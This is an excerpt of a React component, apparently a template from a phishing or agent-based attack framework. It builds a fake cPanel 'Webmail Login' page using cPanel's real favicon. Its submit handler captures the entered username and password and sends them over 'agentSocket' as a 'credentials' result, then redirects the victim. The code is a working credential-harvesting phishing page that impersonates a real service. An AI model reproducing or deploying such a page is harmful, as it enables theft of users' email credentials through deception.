...
export const WebmailTemplate: FC<AgentTemplateProps> = ({
	title,
	agentSocket,
	redirectUrl,
}) => {
	useTitle(title || document.title || "Webmail Login");
	useFavicon(
		"https://cpanel.net/wp-content/themes/cPbase/assets/img/favicon.ico"
	);
	...
	const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
		...
		agentSocket.resultsSubject.next({
			type: "credentials",
			payload: { type: "webmail", user, pass },
		});
		if (redirectUrl) {
	...
	return (
		<ThemeProvider theme={theme}>
			<Grid
				sx={{ backgroundColor: "#f0eff0", height: "100vh" }}
				container
				direction="column"
